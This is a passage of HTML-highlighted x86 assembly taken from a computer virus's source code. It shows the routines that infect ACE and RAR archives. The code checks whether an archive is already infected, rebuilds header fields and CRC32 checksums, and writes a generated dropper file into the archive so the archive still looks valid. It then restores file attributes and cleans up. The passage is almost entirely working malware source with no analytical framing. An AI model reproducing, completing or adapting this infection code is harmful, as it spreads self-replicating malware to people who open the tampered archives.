        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;save it</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ACEf_TimeDate</span><span class="sc4">-</span><span class="sc5">ACE_file_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__ar_is_infected</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">exit_now</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">ACEf_HeadSize</span><span class="sc4">-</span><span class="sc5">ACE_file_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_CRC32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">ACEf_HeadCRC</span><span class="sc4">-</span><span class="sc5">ACE_file_start</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">archive_header_first</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;What We Wanna Write (4xW)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">header_filepos</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">archive_read_length</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">          </span><span class="sc1">;write ACE header</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACEf_Filename</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_name</span><span class="sc0">       </span><span class="sc1">;name of dropper</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACEf_FilenameSize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">ACE_without_filename</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACEf_HeadSize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropper_size</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACEf_CompressedSize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACEf_UnCompressedSize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACEf_FilenameSize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">ACEf_Filename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ACEf_HeadType</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACEf_HeadType</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_CRC32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACEf_HeadCRC</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_filesize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACEf_HeadCRC</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;start of ACE file header</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACEf_FilenameSize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ACE_file_length</span><span class="sc0"> </span><span class="sc1">;size of ACE file header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">          </span><span class="sc1">;write ACE file header</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">exit_now</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropper_memory</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropper_size</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">

    </span><span class="sc5">exit_now</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">exit_now_6</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">errors</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">exit_now_5</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropper_memory</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
    </span><span class="sc5">exit_now_5</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">errors</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">exit_now_4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropper_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fclose</span><span class="sc0">
    </span><span class="sc5">exit_now_4</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">errors</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">exit_now_3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fclose</span><span class="sc0">
    </span><span class="sc5">exit_now_3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">errors</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">exit_now_2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">archive_header_first</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
    </span><span class="sc5">exit_now_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">errors</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">exit_now_1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_fileattr</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fsetattr</span><span class="sc0">        </span><span class="sc1">;restore attribs</span><span class="sc0">
    </span><span class="sc5">exit_now_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">errors</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">exit_now_0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Archive_Buffer</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
    </span><span class="sc5">exit_now_0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">errors</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__iluzo_return_7</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;find "g_iluzo_return" text</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;in this file for more infoz</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ infection in RAR archivez ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   input:  eax=dropper file CRC</span><span class="sc0">
</span><span class="sc1">;       ebx=RAR_Archive</span><span class="sc0">
</span><span class="sc1">;       edi=filepos of header in file</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">infect_RAR</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RAR_FileCRC</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__ar_load_header</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">RAR_FileFlags</span><span class="sc4">-</span><span class="sc5">RAR_header_start</span><span class="sc4">+</span><span class="sc5">RAR_MagicSize</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">exit_now</span><span class="sc0">            </span><span class="sc1">;mult. volume ?</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">RAR_HeaderSize</span><span class="sc4">-</span><span class="sc5">RAR_header_start</span><span class="sc4">+</span><span class="sc5">RAR_MagicSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">RAR_MagicSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;absolute start in memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;save it</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">RAR_TimeDate</span><span class="sc4">-</span><span class="sc5">RAR_header_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__ar_is_infected</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">exit_now</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">RAR_HeaderSize</span><span class="sc4">-</span><span class="sc5">RAR_header_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_CRC32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">RAR_HeaderCRC</span><span class="sc4">-</span><span class="sc5">RAR_header_start</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">archive_header_first</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">header_filepos</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">archive_read_length</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">          </span><span class="sc1">;write RAR header</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RAR_Filename</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_name</span><span class="sc0">       </span><span class="sc1">;name of dropper</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RAR_FilenameSize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">RAR_file_length</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RAR_HeaderSize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropper_size</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RAR_CompressedSize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RAR_UnCompressedSize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RAR_FilenameSize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">RAR_without_filename</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RAR_HeaderType</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_CRC32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RAR_HeaderCRC</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_filesize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RAR_HeaderCRC</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;start of RAR file header</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RAR_FilenameSize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">RAR_file_length</span><span class="sc0"> </span><span class="sc1">;size of RAR file header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">          </span><span class="sc1">;write RAR file header</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">exit_now</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropper_memory</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropper_size</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_now</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ other common functionz for ACE/RAR archivez ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Allocate memory and load header of ACE or RAR header there</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">__ar_load_header</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc4">*</span><span class="sc5">ACE_header_needed</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">archive_header_first</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">errors</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1000b</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;new place in memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;file pos</span><span class="sc0">
